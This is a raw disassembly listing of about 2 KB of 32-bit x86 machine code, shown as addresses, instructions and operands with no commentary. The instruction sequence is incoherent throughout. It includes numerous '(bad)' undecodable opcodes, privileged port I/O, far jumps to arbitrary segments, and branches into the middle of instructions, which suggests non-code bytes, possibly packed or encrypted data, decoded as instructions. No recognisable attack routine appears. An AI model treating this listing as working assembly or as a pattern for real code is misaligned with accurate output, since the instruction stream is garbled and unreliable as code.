  402199:	xlat   BYTE PTR ds:[ebx]
  40219a:	push   ecx
  40219b:	(bad)  [ebx-0x9acde8b]
  4021a1:	jno    0x402173
  4021a3:	or     ch,BYTE PTR [bx+di+0x3d7c]
  4021a8:	jne    0x402226
  4021aa:	lahf   
  4021ab:	adc    DWORD PTR [ebp-0x5],0x6ff07dfb
  4021b2:	out    0xee,al
  4021b4:	stc    
  4021b5:	mov    ah,0xb1
  4021b7:	stc    
  4021b8:	mov    ds:0x2852366f,al
  4021bd:	jne    0x4021c6
  4021bf:	loop   0x402229
  4021c1:	cmp    BYTE PTR [eax],bl
  4021c3:	not    DWORD PTR [ebp-0x5d6db06]
  4021c9:	push   0xffffff9e
  4021cb:	fucomi st,st(5)
  4021cd:	jbe    0x40216d
  4021cf:	xor    eax,0xb293ca71
  4021d4:	(bad)  
  4021d5:	stos   BYTE PTR es:[edi],al
  4021d6:	(bad)  
  4021d7:	sbb    ch,BYTE PTR [eax-0x2b00f79e]
  4021dd:	test   ecx,0x34391ae3
  4021e3:	push   ebp
  4021e4:	imul   ebp,DWORD PTR ds:0xdfcc6523,0xffffffb2
  4021eb:	stc    
  4021ec:	scas   al,BYTE PTR es:[edi]
  4021ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ee:	pop    es
  4021ef:	lock pop ebx
  4021f1:	fistp  WORD PTR [eax]
  4021f3:	sbb    eax,0x44da7ee9
  4021f8:	cwde   
  4021f9:	dec    edx
  4021fa:	pop    esi
  4021fb:	dec    edx
  4021fc:	enter  0xfa9b,0x15
  402200:	and    eax,0x51cf3ca5
  402205:	sbb    al,0x87
  402207:	mov    ebx,0xe1269dfe
  40220c:	out    0xcc,al
  40220e:	jmp    0x4021c4
  402210:	inc    edi
  402211:	rol    BYTE PTR [edi],0x3f
  402214:	outs   dx,BYTE PTR ds:[esi]
  402215:	or     eax,0xb6e061d0
  40221a:	inc    esp
  40221b:	leave  
  40221c:	push   edx
  40221d:	add    esp,edx
  40221f:	xchg   esp,eax
  402220:	pop    eax
  402221:	retf   
  402222:	xchg   edx,eax
  402223:	addr16 dec ebx
  402225:	mov    ah,0x6
  402227:	mov    dl,BYTE PTR [ebp-0x17]
  40222a:	std    
  40222b:	iretw  
  40222d:	lods   eax,DWORD PTR ds:[esi]
  40222e:	dec    eax
  40222f:	and    BYTE PTR [edi+0x6898113e],bl
  402235:	leave  
  402236:	ficom  DWORD PTR [eax+ebx*4]
  402239:	ret    0x88f7
  40223c:	pop    ebp
  40223d:	rol    DWORD PTR [ebp-0x473f7772],cl
  402243:	mov    al,0x2
  402245:	or     dh,ch
  402247:	jge    0x4021ee
  402249:	cmc    
  40224a:	test   DWORD PTR [edx+0x6d],0x47c63393
  402251:	xor    esp,ebp
  402253:	jmp    DWORD PTR [ecx+eiz*4-0x6d]
  402257:	pop    es
  402258:	lds    ebp,FWORD PTR [eax]
  40225a:	mov    bl,0x99
  40225c:	sahf   
  40225d:	ror    eax,1
  40225f:	(bad)  
  402260:	fdivp  st(1),st
  402262:	(bad)  
  402263:	and    eax,0xe29d352c
  402268:	push   ecx
  402269:	ins    DWORD PTR es:[edi],dx
  40226a:	cwde   
  40226b:	xor    ch,cl
  40226d:	mov    esp,0x24266e35
  402272:	call   0xc2937788
  402277:	pushf  
  402278:	xor    DWORD PTR [ecx+0x78],eax
  40227b:	and    edi,DWORD PTR [esi-0x66f90e4c]
  402281:	push   0xffffffa3
  402283:	call   0xb58c1614
  402288:	xor    bl,bh
  40228a:	out    0x3,eax
  40228c:	jg     0x40220e
  40228e:	mov    ebp,0x611ca5a2
  402293:	sbb    DWORD PTR [ebp-0x44557ef0],ebx
  402299:	push   esp
  40229a:	xchg   edi,eax
  40229b:	out    dx,al
  40229c:	ds xor al,0x17
  40229f:	cwde   
  4022a0:	in     al,0x4d
  4022a2:	and    DWORD PTR [esi-0x6e],edi
  4022a5:	dec    edx
  4022a6:	scas   eax,DWORD PTR es:[edi]
  4022a7:	pop    es
  4022a8:	daa    
  4022a9:	mov    cl,0x4f
  4022ab:	sbb    BYTE PTR [ebx-0x103c84a],dl
  4022b1:	jp     0x40227a
  4022b3:	push   ds
  4022b4:	retf   
  4022b5:	xchg   esi,eax
  4022b6:	mov    eax,ds:0xda1b8a42
  4022bb:	inc    eax
  4022bc:	adc    eax,0xaea8bff4
  4022c1:	jbe    0x4022ed
  4022c3:	mov    ebx,0x272bd225
  4022c8:	mov    ebx,0xaf86475d
  4022cd:	dec    esp
  4022ce:	add    ecx,edi
  4022d0:	lds    eax,FWORD PTR [ebx+0x71]
  4022d3:	xchg   ebp,eax
  4022d4:	stos   BYTE PTR es:[edi],al
  4022d5:	mov    eax,ds:0xb8783364
  4022da:	or     eax,0x1ff81ab5
  4022df:	mov    cl,0x6c
  4022e1:	push   edx
  4022e2:	paddq  mm0,QWORD PTR [edi+0x17891984]
  4022e9:	cmp    ch,0x2e
  4022ec:	sbb    edi,DWORD PTR [ebx]
  4022ee:	inc    ebx
  4022ef:	mov    ebx,0x1d4b852d
  4022f4:	test   eax,0x46a89be3
  4022f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022fa:	shl    DWORD PTR [eax+0x17],cl
  4022fd:	sub    eax,DWORD PTR [ebx-0x16]
  402300:	popa   
  402301:	(bad)  
  402303:	ins    BYTE PTR es:[edi],dx
  402304:	push   ss
  402305:	adc    al,0xd1
  402307:	jmp    0x572e:0x5b25868a
  40230e:	push   edx
  40230f:	push   0x33a162a7
  402314:	in     eax,0xd1
  402316:	gs rol edi,1
  402319:	sahf   
  40231a:	idiv   BYTE PTR [eax]
  40231c:	jmp    0x8f8d:0x94db7bea
  402323:	mov    ?,WORD PTR [esi]
  402325:	mov    ebx,0x8e98b10c
  40232a:	das    
  40232b:	cmp    ah,BYTE PTR [eax]
  40232d:	and    ebx,DWORD PTR [ecx]
  40232f:	lods   eax,DWORD PTR ds:[esi]
  402330:	push   edx
  402331:	mov    dl,0x7e
  402333:	lds    esp,FWORD PTR [esi-0x41]
  402336:	or     eax,0x3aba685f
  40233b:	js     0x402348
  40233d:	and    bh,bh
  40233f:	cmp    eax,ecx
  402341:	mov    al,ds:0xaab64912
  402346:	leave  
  402347:	int3   
  402348:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40234a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40234b:	cs mov ch,0x31
  40234e:	fild   WORD PTR [edi*4-0x603badb6]
  402355:	xchg   BYTE PTR [esi-0x18],bh
  402358:	mov    dl,0x93
  40235a:	sub    al,0xaa
  40235c:	retf   0x2f8e
  40235f:	mov    bh,0xff
  402361:	and    esi,edx
  402363:	(bad)  
  402365:	push   ds
  402366:	into   
  402367:	xlat   BYTE PTR ds:[ebx]
  402368:	jecxz  0x402329
  40236a:	fnstsw WORD PTR [esi]
  40236c:	and    ecx,DWORD PTR [edi-0x6f26effe]
  402372:	push   ss
  402373:	adc    al,0x16
  402375:	call   0x3ac86245
  40237a:	shl    DWORD PTR [ecx-0x2d6d3ac3],1
  402380:	scas   eax,DWORD PTR es:[edi]
  402381:	lds    edi,FWORD PTR [esi-0x50772d04]
  402387:	inc    esp
  402388:	and    eax,0x47c12e11
  40238d:	les    edx,FWORD PTR [ecx]
  40238f:	jg     0x402397
  402391:	pop    ds
  402392:	jg     0x402404
  402394:	retf   0x5a13
  402397:	pop    eax
  402398:	ins    BYTE PTR es:[edi],dx
  402399:	rcr    BYTE PTR [ebx+0x787261f7],1
  40239f:	or     ebx,DWORD PTR [ebx+0x50]
  4023a2:	push   edx
  4023a3:	mov    ecx,0x7bdbeb66
  4023a8:	sbb    al,0xcf
  4023aa:	or     dl,cl
  4023ac:	pop    ecx
  4023ad:	pop    ds
  4023ae:	jae    0x402421
  4023b0:	cmc    
  4023b1:	adc    al,0xe5
  4023b3:	dec    ecx
  4023b4:	test   dh,ch
  4023b6:	jle    0x402392
  4023b8:	inc    ebx
  4023b9:	xor    dh,bh
  4023bb:	add    eax,0x2743cd03
  4023c0:	loop   0x4023ba
  4023c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023c3:	sbb    al,0xed
  4023c5:	(bad)  
  4023c6:	out    0x41,al
  4023c8:	push   edi
  4023c9:	or     edx,DWORD PTR [eax+eiz*8-0x1b26e95a]
  4023d0:	xchg   ebx,eax
  4023d1:	mov    dh,0x6c
  4023d3:	(bad)
  4023d8:	rol    DWORD PTR [edx],cl
  4023da:	(bad)  ss:[esi-0x30c50773]
  4023e1:	and    al,0x28
  4023e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023e4:	loop   0x40245e
  4023e6:	imul   DWORD PTR [esi-0x30d5bde5]
  4023ec:	arpl   WORD PTR [eax],bp
  4023ee:	inc    ebp
  4023ef:	mov    esi,0xc79d6980
  4023f4:	repz (bad) 
  4023f6:	in     al,0xbf
  4023f8:	ds pop esi
  4023fa:	push   cs
  4023fb:	push   cs
  4023fc:	mov    ch,0xd1
  4023fe:	outs   dx,DWORD PTR ds:[esi]
  4023ff:	jge    0x40243f
  402401:	call   0xb8c1:0x2a3d1e54
  402408:	and    DWORD PTR [ecx+0x61],0xffffffd6
  40240c:	cmp    DWORD PTR [esi],0x5e
  40240f:	int    0xc5
  402411:	mov    DWORD PTR [eax-0x5d],eax
  402414:	test   DWORD PTR [ebp+ecx*8-0x73fe63c3],0xfd86f632
  40241f:	inc    edi
  402420:	stos   DWORD PTR es:[edi],eax
  402421:	dec    ecx
  402422:	and    dl,BYTE PTR [edx]
  402424:	adc    DWORD PTR [edx],0xffffff82
  402427:	mov    bh,0x0
  402429:	xchg   edx,eax
  40242a:	jge    0x402486
  40242c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40242d:	es mov ebx,ds
  402430:	jge    0x402476
  402432:	sub    bl,BYTE PTR [ecx-0x45]
  402435:	ret    
  402436:	in     al,dx
  402437:	dec    ebp
  402438:	lods   al,BYTE PTR ds:[esi]
  402439:	jmp    0x40246f
  40243b:	mov    eax,es
  40243d:	xchg   esp,eax
  40243e:	gs jmp 0x1bc34969
  402444:	push   edx
  402445:	dec    ebp
  402446:	out    dx,eax
  402447:	mov    eax,0x20ffff4f
  40244c:	push   edx
  40244d:	cs jnp 0x402452
  402450:	mov    esp,gs
  402452:	fld    DWORD PTR [ebx+0x0]
  402455:	push   ds
  402456:	sar    DWORD PTR [ecx],cl
  402458:	push   cs
  402459:	int    0xe5
  40245b:	mov    al,0x73
  40245d:	pusha  
  40245e:	or     DWORD PTR [edx-0x36],edi
  402461:	jo     0x402489
  402463:	mov    ecx,DWORD PTR [ebx-0x7d]
  402466:	lods   al,BYTE PTR ds:[esi]
  402467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402468:	popf   
  402469:	sub    esp,esp
  40246b:	dec    edi
  40246c:	out    dx,al
  40246d:	jl     0x4024d8
  40246f:	cmp    esi,DWORD PTR [esi-0x16]
  402472:	scas   al,BYTE PTR es:[edi]
  402473:	callw  0xbdaf
  402477:	xchg   edx,esi
  402479:	test   al,0x32
  40247b:	aas    
  40247c:	loope  0x402426
  40247e:	cwde   
  40247f:	sar    BYTE PTR [edi+0x3cf16768],cl
  402485:	stos   BYTE PTR es:[edi],al
  402486:	or     DWORD PTR [ebp+0x7c],ebx
  402489:	mov    ah,0xb3
  40248b:	ds mov esi,0x2f72a012
  402491:	fadd   QWORD PTR fs:[edi+0x63]
  402495:	cmp    bh,cl
  402497:	add    al,cl
  402499:	or     DWORD PTR [edi+esi*4-0x24],esi
  40249d:	jo     0x402420
  40249f:	sbb    al,0xcd
  4024a1:	push   ecx
  4024a2:	add    BYTE PTR [esi+0x1511d69a],0x4a
  4024a9:	stos   DWORD PTR es:[edi],eax
  4024aa:	pop    ds
  4024ab:	call   0xcd72ee4a
  4024b0:	sbb    DWORD PTR [eax+0x45fdd637],eax
  4024b6:	popa   
  4024b7:	or     esi,edi
  4024b9:	sub    al,al
  4024bb:	js     0x402446
  4024bd:	mov    dl,dl
  4024bf:	sar    DWORD PTR [ebp-0x4412b91c],1
  4024c5:	out    0x6b,al
  4024c7:	stc    
  4024c8:	int    0x1e
  4024ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024cb:	ins    BYTE PTR es:[edi],dx
  4024cc:	sub    BYTE PTR ds:0x2a1ebe74,al
  4024d2:	pop    esp
  4024d3:	addr16 adc al,0x84
  4024d6:	ror    DWORD PTR [ecx],0x78
  4024d9:	imul   ebp,DWORD PTR [ebp+0x20],0x669b05e
  4024e0:	fistp  WORD PTR [edx-0x501786cc]
  4024e6:	push   ebx
  4024e7:	div    BYTE PTR [ecx+0x7bc096f4]
  4024ed:	cwde   
  4024ee:	aas    
  4024ef:	retf   
  4024f0:	jl     0x40252e
  4024f2:	popf   
  4024f3:	and    dl,BYTE PTR [esi+0x1f]
  4024f6:	add    esp,DWORD PTR ds:0xdd3878
  4024fc:	or     al,0x62
  4024fe:	mov    ebx,0xb5f61dc3
  402503:	loop   0x402562
  402505:	cli    
  402506:	mov    ds:0x8c14e791,al
  40250b:	xor    DWORD PTR [ebx-0x9],ebp
  40250e:	cmp    edx,DWORD PTR [ebp-0x2c]
  402511:	sar    BYTE PTR [edi],0xd4
  402514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402516:	jecxz  0x4024f4
  402518:	jmp    0x90ba0fdd
  40251d:	sahf   
  40251e:	pop    esp
  40251f:	js     0x402507
  402521:	xor    BYTE PTR [edi],0x6d
  402524:	xor    BYTE PTR [esi+0x6279a6a],cl
  40252a:	inc    eax
  40252b:	outs   dx,DWORD PTR ds:[esi]
  40252c:	outs   dx,BYTE PTR ds:[esi]
  40252d:	js     0x402514
  40252f:	and    esp,DWORD PTR [esi+0x5]
  402532:	mov    edx,0x50fa9a9c
  402537:	add    DWORD PTR ds:0x56357446,ecx
  40253d:	cld    
  40253e:	dec    esp
  40253f:	loope  0x402527
  402541:	add    BYTE PTR [ebp+0x2d05054d],0x19
  402548:	jl     0x4025af
  40254a:	or     BYTE PTR [edi+0xe],0xd3
  40254e:	mov    ch,0x25
  402550:	dec    esi
  402551:	lahf   
  402552:	jne    0x402577
  402554:	jmp    0xe3e9:0x6b5d894a
  40255b:	or     DWORD PTR [eax],ebp
  40255d:	add    al,BYTE PTR ds:0xcc7a8ca
  402563:	outs   dx,DWORD PTR ds:[esi]
  402564:	(bad)  
  402566:	retf   
  402567:	mov    esp,0xbc55787d
  40256c:	rol    DWORD PTR [edi+0x2d0a0969],1
  402572:	mov    bl,0xe2
  402574:	push   DWORD PTR [ebp+0x47]
  402577:	sbb    DWORD PTR [esi],0xb99535f4
  40257d:	pop    ds
  40257e:	mov    BYTE PTR [edi-0x78e5dfb6],bh
  402584:	sub    eax,0x8f04b082
  402589:	jo     0x40256d
  40258b:	xor    eax,0x892f5d48
  402590:	mov    bl,0x7e
  402592:	loope  0x402571
  402594:	lods   al,BYTE PTR ds:[esi]
  402595:	sub    DWORD PTR [edi-0x12],esp
  402598:	adc    al,0x1f
  40259a:	(bad)  
  40259b:	enter  0x884b,0x78
  40259f:	iret   
  4025a0:	aam    0xc
  4025a2:	mov    ecx,0x2397c91c
  4025a7:	jmp    0x3e97:0x2c2a5ad6
  4025ae:	dec    eax
  4025af:	stos   BYTE PTR es:[edi],al
  4025b0:	jnp    0x402566
  4025b2:	popa   
  4025b3:	pushf  
  4025b4:	sub    al,0xd0
  4025b6:	stc    
  4025b7:	movups XMMWORD PTR ds:[eax+0x27fff44b],xmm0
  4025bf:	mov    ds:0x5d66ae34,eax
  4025c4:	cmp    esp,DWORD PTR ds:0x86dca61c
  4025ca:	stc    
  4025cb:	xor    BYTE PTR [edx+0x5f],al
  4025ce:	pop    esi
  4025cf:	ficomp DWORD PTR [ebp-0x463ad33f]
  4025d5:	pushf  
  4025d6:	cmp    BYTE PTR [edx+0x56a51a91],bl
  4025dc:	adc    BYTE PTR [ebx-0xfe60943],dl
  4025e2:	add    DWORD PTR [eax+eax*8-0x25],ecx
  4025e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025e7:	(bad)  
  4025e9:	std    
  4025ea:	pop    edi
  4025eb:	daa    
  4025ec:	xchg   DWORD PTR [ebp+0x63d2f4be],edi
  4025f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025f3:	sub    BYTE PTR [ebp+0x60c57c7c],dh
  4025f9:	ins    DWORD PTR es:[edi],dx
  4025fa:	scas   al,BYTE PTR es:[edi]
  4025fb:	dec    edi
  4025fc:	and    dl,0x97
  4025ff:	jle    0x4025f4
  402601:	pop    edx
  402602:	sbb    ebx,DWORD PTR [eax+0x69914918]
  402608:	pop    esi
  402609:	cs adc esp,DWORD PTR ss:[edx+0x1cf7ff4f]
  402611:	lock lock cld 
  402614:	mov    ch,0xc9
  402616:	xchg   edi,eax
  402617:	in     eax,0x71
  402619:	inc    eax
  40261a:	add    esi,DWORD PTR [ebx-0x6a45391]
  402620:	pop    esi
  402621:	sbb    dh,BYTE PTR [ecx]
  402623:	mov    eax,ds:0xdb166017
  402628:	jl     0x4025bd
  40262a:	sbb    BYTE PTR [eax-0x4b72ff6a],dl
  402630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402631:	fadd   QWORD PTR [edi]
  402633:	and    al,BYTE PTR [ebx]
  402635:	mov    ah,0xfb
  402637:	xlat   BYTE PTR ds:[ebx]
  402638:	out    dx,al
  402639:	mov    ds:0x1bf4b863,al
  40263e:	sbb    DWORD PTR [edx],ebp
  402640:	add    al,0x5a
  402642:	outs   dx,DWORD PTR ds:[esi]
  402643:	jno    0x402622
  402645:	push   ds
  402646:	inc    esp
  402647:	dec    ebp
  402648:	mov    bl,0x4c
  40264a:	push   0xffffffac
  40264c:	pop    ebp
  40264d:	fst    QWORD PTR [esi+0x3d]
  402650:	das    
  402651:	dec    edx
  402652:	jnp    0x4025e7
  402654:	jb     0x4026a1
  402656:	dec    edi
  402657:	daa    
  402658:	ficom  WORD PTR [edi+0x4]
  40265b:	adc    DWORD PTR [eax],ecx
  40265d:	cmp    ecx,DWORD PTR [ebp+0x4e]
  402660:	(bad)  
  402661:	popf   
  402662:	ins    BYTE PTR es:[edi],dx
  402663:	or     esi,DWORD PTR [ecx-0x3d]
  402666:	and    dh,BYTE PTR [bp+di-0x5445]
  40266b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40266c:	retf   0x5dc3
  40266f:	js     0x402630
  402671:	loope  0x402631
  402673:	mov    cl,0x94
  402675:	(bad)
  402678:	mov    esi,0x3fbd8bd3
  40267d:	iret   
  40267e:	sahf   
  40267f:	dec    edx
  402680:	xor    ebx,DWORD PTR [ecx+0x1fb444c0]
  402686:	inc    ecx
  402687:	push   0xffffff95
  402689:	jo     0x4026d4
  40268b:	(bad)  
  40268c:	inc    DWORD PTR [ecx+0x22]
  40268f:	add    bl,al
  402691:	xchg   esp,esp
  402693:	adc    eax,0x5837aecd
  402698:	popa   
  402699:	and    ah,ah
  40269b:	inc    eax
  40269c:	in     al,0xfd
  40269e:	outs   dx,DWORD PTR ds:[esi]
  40269f:	mov    esp,0x3f37f875
  4026a4:	add    BYTE PTR [edx+eiz*1],dh
  4026a7:	test   eax,0x1fd3a1e8
  4026ac:	and    edx,DWORD PTR ds:0x902cbcb3
  4026b2:	push   edi
  4026b3:	call   0xb83d6f03
  4026b8:	ret    
  4026b9:	daa    
  4026ba:	and    edx,DWORD PTR [edi]
  4026bc:	add    al,cl
  4026be:	data16 jae 0x402719
  4026c1:	mov    eax,0x8f07106e
  4026c6:	fst    DWORD PTR [ebx+0x36]
  4026c9:	pop    esp
  4026ca:	daa    
  4026cb:	push   edi
  4026cc:	loop   0x402739
  4026ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026cf:	(bad)
  4026d2:	loop   0x402679
  4026d4:	sbb    eax,0xb9b3b411
  4026d9:	push   ebx
  4026da:	(bad)  
  4026db:	fldcw  WORD PTR ds:0x554ab044
  4026e1:	ret    
  4026e2:	sbb    DWORD PTR ds:[ebx+0x1b89346b],ecx
  4026e9:	and    BYTE PTR [edi+eiz*1],0x1f
  4026ed:	sub    DWORD PTR [edi],esp
  4026ef:	stos   DWORD PTR es:[edi],eax
  4026f0:	imul   esp,eax,0x77dcb25a
  4026f6:	ret    
  4026f7:	pop    ds
  4026f8:	add    eax,0x3be3067a
  4026fd:	aas    
  4026fe:	mov    DWORD PTR [edx],esi
  402700:	mov    dl,0xa8
  402702:	(bad)  
  402703:	(bad)  
  402705:	mov    eax,ds:0xdbf70ac7
  40270a:	add    ebx,DWORD PTR [ebx]
  40270c:	arpl   WORD PTR [edx],dx
  40270e:	or     edx,DWORD PTR [ecx+0x1e]
  402711:	pop    eax
  402712:	lock push edi
  402714:	hlt    
  402715:	arpl   WORD PTR [ecx+eiz*4],bx
  402718:	mov    al,0xd9
  40271a:	inc    esp
  40271b:	out    dx,al
  40271c:	call   0xdb3bc354
  402721:	inc    ebx
  402722:	pop    edx
  402723:	mov    ebx,edi
  402725:	fiadd  DWORD PTR [edi]
  402727:	xchg   ebp,eax
  402728:	push   edx
  402729:	inc    ecx
  40272a:	out    0x80,eax
  40272c:	das    
  40272d:	adc    BYTE PTR [esi-0x10],bh
  402730:	fsub   QWORD PTR [esp+edx*8]
  402733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402734:	frstor [ebp-0x34]
  402737:	sbb    cl,BYTE PTR [eax-0x50]
  40273a:	sahf   
  40273b:	dec    edx
  40273c:	xor    al,0x28
  40273e:	mov    ebp,0x713b4fa7
  402743:	mov    dl,0xdc
  402745:	(bad)  
  402746:	mov    ebx,0x208d95ad
  40274b:	mov    ebx,0x5f02f092
  402750:	and    eax,0x8b9b1d3
  402755:	data16 and ch,BYTE PTR [ecx]
  402758:	push   esi
  402759:	mov    WORD PTR [ecx+0x50e2505],ds
  40275f:	in     al,dx
  402760:	xlat   BYTE PTR ds:[ebx]
  402761:	and    DWORD PTR [edx+0x60],esp
  402764:	(bad)  
  402765:	xor    eax,0x1ca85a57
  40276a:	ds pop ss
  40276c:	mov    dl,0x38
  40276e:	test   dh,ch
  402770:	rol    cl,1
  402772:	cmp    DWORD PTR [ebx+0x37],edi
  402775:	(bad)  
  402776:	inc    eax
  402777:	iret   
  402778:	test   BYTE PTR [edi+eax*8-0x58a43d44],0x5a
  402780:	ror    dh,0x4c
  402783:	jo     0x402787
  402785:	jno    0x4027b5
  402787:	cmp    DWORD PTR [ecx+ecx*1],edi
  40278a:	jl     0x402792
  40278c:	(bad)  
  40278e:	mov    al,ds:0xdcf5603e
  402793:	or     BYTE PTR [eax+0x1e],0xf0
  402797:	xor    al,0xd7
  402799:	test   al,0x4b
  40279b:	push   esi
  40279c:	jl     0x4027f5
  40279e:	gs loop 0x4027cf
  4027a1:	ds dec ecx
  4027a3:	sbb    bl,dh
  4027a5:	adc    al,0xb2
  4027a7:	xor    ch,BYTE PTR [edi-0x52]
  4027aa:	cmp    eax,0xa1a333d6
  4027af:	add    al,0xf4
  4027b1:	pop    edx
  4027b2:	nop
  4027b3:	inc    esp
  4027b4:	dec    ecx
  4027b5:	mov    al,0x9b
  4027b7:	push   0x50dc5b2
  4027bc:	rcl    BYTE PTR [edi-0x3c],cl
  4027bf:	push   edi
  4027c0:	mov    al,0x95
  4027c2:	mov    ecx,0x21700168
  4027c7:	push   es
  4027c8:	add    cl,BYTE PTR [esi+0x58]
  4027cb:	outs   dx,DWORD PTR ds:[esi]
  4027cc:	das    
  4027cd:	fdivrp st(0),st
  4027cf:	enter  0x8aa,0xd2
  4027d3:	jns    0x4027c1
  4027d5:	pop    ebp
  4027d6:	mov    ecx,0xbd434592
  4027db:	push   ebx
  4027dc:	into   
  4027dd:	dec    esp
  4027de:	pop    esi
  4027df:	sub    cl,dl
  4027e1:	lock in al,dx
  4027e3:	(bad)  
  4027e4:	push   esi
  4027e5:	mov    BYTE PTR [ebx-0x16],ah
  4027e8:	in     al,dx
  4027e9:	rcl    BYTE PTR [ecx],0x96
  4027ec:	inc    edi
  4027ed:	test   eax,0x6036499d
  4027f2:	popa   
  4027f3:	sub    BYTE PTR [edi],bh
  4027f5:	add    al,0x85
  4027f7:	idiv   BYTE PTR [ebx]
  4027f9:	je     0x402831
  4027fb:	mov    BYTE PTR [eax-0x7febd0e2],al
  402801:	icebp  
  402802:	call   0xd7b26ee3
  402807:	ds dec ebx
  402809:	lahf   
  40280a:	mov    bh,0x4a
  40280c:	test   DWORD PTR [ebx-0x2139acbd],esi
  402812:	call   0xcc5b:0x1c54519
  402819:	dec    ebx
  40281a:	pop    esi
  40281b:	test   DWORD PTR [ebx],ebx
  40281d:	push   ecx
  40281e:	xor    ah,BYTE PTR [ebp+edi*4-0x5d0333c]
  402825:	xchg   esi,eax
  402826:	out    0x68,al
  402828:	ss sbb ah,ah
  40282b:	xor    ch,cl
  40282d:	cli    
  40282e:	sahf   
  40282f:	push   esp
  402830:	mov    edx,0xd5fc11ed
  402835:	jnp    0x402818
  402837:	mov    ecx,0x557456bf
  40283c:	inc    ebx
  40283d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40283e:	ja     0x4027ed
  402840:	mov    esp,0xd76d415d
  402845:	pop    ss
  402846:	sbb    edx,ebp
  402848:	inc    esi
  402849:	lea    edx,[edx-0x24]
  40284c:	sbb    ebx,DWORD PTR [eax+0x395dcfd7]
  402852:	int    0x46
  402854:	(bad)  
  402855:	mov    edi,0xf201b813
  40285a:	popf   
  40285b:	scas   eax,DWORD PTR es:[edi]
  40285c:	test   DWORD PTR [ecx],ebx
  40285e:	cmp    DWORD PTR [ebp+0x27],ebx
  402861:	ins    BYTE PTR es:[edi],dx
  402862:	jne    0x402839
  402864:	mov    WORD PTR es:[ecx],fs
  402867:	ins    DWORD PTR es:[edi],dx
  402868:	retf   
  402869:	adc    DWORD PTR [esp+ebx*1-0x1f],esi
  40286d:	scas   al,BYTE PTR es:[edi]
  40286e:	add    dh,BYTE PTR [ebx+0x52]
  402871:	fistp  WORD PTR [esi-0x55]
  402874:	mov    dl,0x62
  402876:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402878:	dec    DWORD PTR [edi-0xe]
  40287b:	or     eax,0x8afc839f
  402880:	retf   0xa6e9
  402883:	out    0xf0,al
  402885:	pop    ds
  402886:	inc    ebp
  402887:	mov    esi,DWORD PTR ds:0xab71f87c
  40288d:	push   eax
  40288e:	adc    al,0x96
  402890:	aad    0xfb
  402892:	ins    BYTE PTR es:[edi],dx
  402893:	cmp    eax,0x247333f3
  402898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402899:	pop    ebp
  40289a:	dec    esi
  40289b:	imul   ebx,ebp,0xb1e37fc1
  4028a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028a2:	fcom   DWORD PTR ds:0xd50a1ef0
  4028a8:	or     eax,0xfecbec6c
  4028ad:	xchg   ebx,eax
  4028ae:	(bad)  
  4028af:	stos   DWORD PTR es:[edi],eax
  4028b0:	sub    dl,BYTE PTR [eax-0x574bb7f1]
  4028b6:	daa    
  4028b7:	pop    esi
  4028b8:	sbb    ah,BYTE PTR [ecx-0x277f7865]
  4028be:	into   
  4028bf:	adc    eax,0x735a8cd0
  4028c4:	mov    ebp,0xe4f9a3a
  4028c9:	mov    ds:0xaafc7923,eax
  4028ce:	call   0xe28a86a5
  4028d3:	xlat   BYTE PTR ds:[ebx]
  4028d4:	cmp    al,0xd2
  4028d6:	(bad)  
  4028d7:	repnz or dl,0x7b
  4028db:	out    dx,eax
  4028dc:	push   ss
  4028dd:	jne    0x40287a
  4028df:	pop    eax
  4028e0:	adc    DWORD PTR ds:0xf791655b,eax
  4028e6:	or     eax,0xf2751001
  4028eb:	shr    DWORD PTR [edi+eax*8],0xab
  4028ef:	pop    esp
  4028f0:	lods   eax,DWORD PTR ds:[esi]
  4028f1:	fsub   st(7),st
  4028f3:	ret    0x4022
  4028f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028f7:	lods   al,BYTE PTR ds:[esi]
  4028f8:	cmp    BYTE PTR [esi+0x32],0x33
  4028fc:	ja     0x40292a
  4028fe:	outs   dx,BYTE PTR ds:[esi]
  4028ff:	jmp    0x531cdceb
  402904:	sbb    DWORD PTR [ebp-0x825d07],ebp
  40290a:	pop    edx
  40290b:	ja     0x402908
  40290d:	lds    esi,FWORD PTR [edx]
  40290f:	inc    esi
  402910:	add    cl,0x99
  402913:	mov    bx,0xb351
  402917:	inc    ecx
  402918:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40291a:	jmp    0xcab3029e
  40291f:	lods   al,BYTE PTR ds:[esi]
  402920:	add    edx,DWORD PTR [esi]
  402922:	mov    ebx,cs
  402924:	cs (bad) 
  402926:	data16 test BYTE PTR [ebp+0x2b],ah
  40292a:	cs mov edx,esp
  40292d:	shl    DWORD PTR [ebx+eiz*4+0x512cb425],cl
  402934:	or     cl,BYTE PTR [eax-0x2f018d66]
  40293a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40293b:	push   ds
  40293c:	jb     0x40296b
  40293e:	not    BYTE PTR [esi-0x26]
  402941:	xchg   edi,eax
  402942:	stc    
  402943:	mov    cl,0x7d
  402945:	adc    ebx,eax
  402947:	push   0x16c2b6dd
  40294c:	push   es
  40294d:	jge    0x402926
  40294f:	cmc    
  402950:	iret   
  402951:	sub    eax,0xdaf69400
  402956:	xor    eax,0x146ba547
  40295b:	out    dx,eax
